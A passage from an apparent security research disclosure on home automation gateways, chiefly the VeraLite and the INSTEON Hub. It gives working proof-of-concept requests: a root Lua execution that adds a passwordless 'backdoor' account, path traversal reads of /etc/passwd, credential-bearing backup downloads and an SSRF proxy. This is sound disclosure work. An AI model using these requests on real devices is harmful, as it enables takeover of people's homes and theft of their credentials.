the aforementioned servers. This architecture means that anyone who has access to these
servers or can access the forwarded ports on these servers can access all Internet­connected
VeraLite units, and potentially other Vera models.
There were a large number of flaws discovered quickly in the VeraLite, many of them very
severe and easily exploited. As the vendor has refused to fix or even acknowledge these
vulnerabilities, the authors consider it highly likely that this product has additional undiscovered
vulnerabilities.
3.2.1 Lack of authentication on web console by default
By default, no authentication is required from the LAN to access and operate the control panel on
the VeraLite. While it is possible to require authentication to operate the control panel, it is
disabled in the device’s initial state.
3.2.2 Lack of authentication on UPnP daemon
Devices connected to the VeraLite can be controlled through the web­based console or through
its UPnP daemon. While the web­based console can be set to require authentication, the UPnP
daemon has no such option. It is also possible to execute Lua code as root on the VeraLite by
using the “RunLua” UPnP action of the “HomeAutomationGateway” service. The following POST
request to port 49451 (the UPnP control port) on the VeraLite will add a password­free
root­equivalent user named “backdoor” on the unit:
POST /upnp/control/hag HTTP/1.1
Host: VERA_IP:49451
Accept: text/javascript, text/html, application/xml, text/xml, */*
Accept­Language: en­us,en;q=0.5
Accept­Encoding: gzip, deflate
X­Requested­With: XMLHttpRequest
X­Prototype­Version: 1.7
Content­Type: text/xml;charset=UTF­8
MIME­Version: 1.0
SOAPACTION: "urn:schemas­micasaverde­org:service:HomeAutomationGateway:1#RunLua"
Content­Length: 436
Connection: keep­alive
Pragma: no­cache
Cache­Control: no­cache
         os.execute(&quot;echo 'backdoor%3a%3a0%3a0%3aBackdoor Root
Account%3a/tmp%3a/bin/ash' %3e%3e /etc/passwd&quot;)
3.2.3 Path Traversal
It is possible to retrieve the contents of any file on the VeraLite through the web interface as any
authenticated user. As a guest user, this can be used to escalate privileges to an administrative
user by retrieving the /etc/lighttpd.users file which contains hashed passwords for all users of
the associated VeraLite. As noted in section 3.2.2, these passwords will also enable control of a
VeraLite unit from the Internet. The /etc/passwd file also contains hashes for the root system
user and the remote access user, if remote access has been enabled.
In the VeraLite’s initial unboxed state, the path traversal bug is not exploitable as the
/etc/cmh­ext/ directory doesn’t exist. Using the “store_file.sh” script will create this directory. The
following URL (where VERA_IP is the IP address of the VeraLite unit) can be used to cause the
VeraLite to create the necessary directory:
http://VERA_IP/cgi­bin/cmh/store_file.sh?store_file=test
Once the necessary directory exists, any file can be retrieved by providing a relative path from
the /etc/cmh­ext/ directory to the desired file as the “filename” parameter to the “get_file.sh”
script. An example URL to retrieve the contents of the /etc/passwd file is as follows:
http://VERA_IP/cgi­bin/cmh/get_file.sh?filename=../passwd
3.2.4 Insufficient Authorization Checks
The distinction made between the Guest and Administrator level users on the VeraLite system is
that Guest users should not be able to “save changes” to the Vera unit. What this means in a
literal sense is that the “save” button cannot be used by a Guest level user. However, many
changes and actions are available to a Guest user that can allow a Guest user to take complete
control of a VeraLite unit, whereas Guest users are normally only allowed to interact with the
devices already configured.
3.2.4.1 Firmware Update
Firmware for the VeraLite is unsigned and is in the form of a squashfs file. Freely available tools
(mksquashfs and unsquashfs) exist to convert between a squashfs file and its component files.
It is trivial to unpackage stock VeraLite firmware, modify its contents to include a backdoor,
repackage, and apply the firmware to gain administrative control over a VeraLite system.
3.2.4.2 Settings backup
Backup files can be created and downloaded by Guest users. Backup files are unencrypted and
contain sensitive data, including the hashed passwords for local root and remote administrative
user accounts in the form of the /etc/lighttpd.users and /etc/passwd files. The following URL can
be used to obtain a backup from the system:
http://VERA_IP/cgi­bin/cmh/backup.sh?external=1
3.2.4.3 Test Lua code
Lua is a “lightweight multi­paradigm programming language” [2]. It is possible to run Lua code as
root on the VeraLite system using the web interface. The following POST request will add a
password­free root­equivalent user named “backdoor” to a VeraLite unit:
POST /port_49451/upnp/control/hag HTTP/1.1
Host: VERA_IP
Accept: text/javascript, text/html, application/xml, text/xml, */*
Accept­Language: en­us,en;q=0.5
Accept­Encoding: gzip, deflate
X­Requested­With: XMLHttpRequest
X­Prototype­Version: 1.7
Content­Type: text/xml;charset=UTF­8
MIME­Version: 1.0
SOAPACTION: "urn:schemas­micasaverde­org:service:HomeAutomationGateway:1#RunLua"
Content­Length: 436
Connection: keep­alive
Pragma: no­cache
Cache­Control: no­cache
         os.execute(&quot;echo 'backdoor%3a%3a0%3a0%3aBackdoor Root
Account%3a/tmp%3a/bin/ash' %3e%3e /etc/passwd&quot;)
3.2.5 Server Side Request Forgery
It is possible to use the VeraLite as a proxy using the “proxy.sh” script, traversing network
boundaries and bypassing firewall restrictions, if any exist between the attacker and the VeraLite
unit. A malicious party who has access to the VeraLite control panel can map and attack the
internal network in which a VeraLite is installed.  It can also be used to determine the external IP
address (and by GeoIP lookup, physical address) of the VeraLite unit. The following URL makes
a request for trustwave.com:
http://VERA_IP/cgi­bin/cmh/proxy.sh?url=https://www.trustwave.com
3.2.6 Cross-Site Request Forgery
The VeraLite does not protect against Cross­Site Request Forgery. If a user on the same
network as a VeraLite unit visits a site controlled by an attacker, the attacker can force the user
to perform any action on the VeraLite unit available through the web console or UPnP daemon.
3.2.7 Unconfirmed Authentication Bypass
As discussed in section 3.2, the architecture of the VeraLite remote access system allows an
attacker who can bypass the firewall on the forwarding server to gain access to all
Internet­connected VeraLite units through the ports forwarded via SSH.
The forwarding servers for the Vera units have a script named “proxy.sh.php” which takes
identically named and formed arguments to the “proxy.sh” script mentioned in section 3.2.5. If
the same vulnerability that exists in “proxy.sh” exists in “proxy.sh.php”, it is likely possible to
bypass the firewall and access any Internet­connected Vera unit without authentication.
3.2.8 Vulnerable libupnp Version
Portable SDK for UPnP version 1.6.17 and earlier are vulnerable to various remote buffer
overflow attacks [5]. The MiCasaVerde VeraLite uses Portable SDK for UPnP version 1.6.6.
3.3 INSTEON Hub
From INSTEON website [4]:
“INSTEON Hub is an INSTEON central controller for the rest of us; a simple and straightforward
device that connects you to your home from any smartphone or tablet, anywhere in the world.
Control INSTEON light bulbs, wall switches, outlets, and thermostats at home or remotely and
receive instant email or text message alerts from motion,door and window, water leak, and smoke
sensors while you’re away.”
The INSTEON Hub is a home automation gateway created by INSTEON. It allows a home user
to setup a gateway where they can control lights, appliances, door bells, cameras, thermostats,
and door locks. It has several mobile device applications and a cloud hosted web portal that one
can use to access and control all home devices.
3.3.1 Lack of authentication
The version released in December 2012 (2422­222) does not have the ability to enable or require
authentication for web service calls to the device. Previous versions allowed the user to set
Basic HTTP authentication.
Any network access to the hub allows full control over all connected devices. The default method
of setup requires an externally accessible port to be forwarded to the device; Anyone who can
access the device can run amok in your house without the requirement of having proximity
access to your home.